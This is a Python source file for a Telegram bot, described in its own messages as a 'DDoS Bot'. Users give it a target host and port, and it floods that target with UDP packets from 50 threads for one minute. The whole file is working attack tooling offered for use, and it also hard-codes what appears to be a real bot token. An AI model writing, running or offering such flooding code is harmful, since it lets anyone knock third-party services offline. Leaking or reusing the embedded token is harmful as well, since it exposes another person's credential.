import time
import socket
import random
import threading
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler

# DDoS tool functions
def run(ip, port, times, threads, user_id, context):
    data = random._urandom(1024)
    start_time = time.time()  # To track the 1-minute time duration
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for _ in range(times):
                s.sendto(data, addr)

            # Check if 1 minute has passed
            if time.time() - start_time >= 60:
                context.bot.send_message(chat_id=user_id, text="Packet attack running...")
                start_time = time.time()  # Reset the start time for another 1-minute cycle
        except Exception as e:
            print(f"[{user_id}] Error: {e}")
            s.close()

        # Stop the attack after 1 minute and notify the user
        if time.time() - start_time >= 60:
            context.bot.send_message(chat_id=user_id, text="Packet attack finished!")
            break  # Stop the attack after 1 minute

def start_attack(ip, port, times=600, threads=50, user_id=None, context=None):
    for _ in range(threads):
        th = threading.Thread(target=run, args=(ip, port, times, threads, user_id, context))
        th.start()

    time.sleep(60)  # Run the attack for 1 minute
    print(f"[{user_id}] Attack finished.")

    # Remove the reference to the attack thread from user_data once the attack finishes
    if 'attack_thread' in context.user_data:
        del context.user_data['attack_thread']

# Conversation states
HOST, PORT = range(2)

# Locks to ensure thread safety for each user
user_locks = {}

# Telegram bot handlers
async def start(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    # Initialize a lock for each user if not already initialized
    if user_id not in user_locks:
        user_locks[user_id] = threading.Lock()

    # Acquire the lock to ensure only one attack runs at a time for the user
    with user_locks[user_id]:
        # Check if there's an active attack thread
        if 'attack_thread' in context.user_data and context.user_data['attack_thread'].is_alive():
            await update.message.reply_text("You already have an attack running. Please wait until it finishes.")
            return

        await update.message.reply_text("Welcome to the DDoS Bot! Please provide the following details:")

        await update.message.reply_text("Host/Ip:")
        return HOST

async def host(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    context.user_data["ip"] = update.message.text
    await update.message.reply_text("Port:")
    return PORT

async def port(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    try:
        # Ensure the port is an integer
        port = int(update.message.text)
        context.user_data["port"] = port
    except ValueError:
        await update.message.reply_text("Please enter a valid port number:")
        return PORT  # Stay in the PORT state if the input is invalid

    await update.message.reply_text("Ready to start the attack. We always use UDP, Packets per one connection: 600, Threads: 50.")

    ip = context.user_data["ip"]
    
    # Start the DDoS attack and track the attack thread for the user
    context.user_data['attack_thread'] = threading.Thread(target=start_attack, args=(ip, port, 600, 50, user_id, context))
    context.user_data['attack_thread'].start()

    await update.message.reply_text(f"Attack on {ip}:{port} started for 1 minute.")
    return ConversationHandler.END

async def stop(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if 'attack_thread' in context.user_data:
        # Stop the current attack thread
        context.user_data['attack_thread'].join()  # Ensure attack finishes
        del context.user_data['attack_thread']  # Remove the thread reference
        await update.message.reply_text(f"Attack stopped.")
    else:
        await update.message.reply_text("No attack is currently running.")
    
    return ConversationHandler.END

async def cancel(update: Update, context: CallbackContext):
    await update.message.reply_text("Operation canceled.")
    return ConversationHandler.END

def main():
    # Replace with your actual bot token
    token = "7908390858:AAG4l1DFXhd3q12HLmL7RvC6iZ-hgH1MKGU"
    
    application = Application.builder().token(token).build()

    conversation_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            HOST: [MessageHandler(filters.TEXT & ~filters.COMMAND, host)],
            PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, port)],
        },
        fallbacks=[CommandHandler("stop", stop), CommandHandler("cancel", cancel)],
    )

    application.add_handler(conversation_handler)
    application.run_polling()

if __name__ == '__main__':
    main()
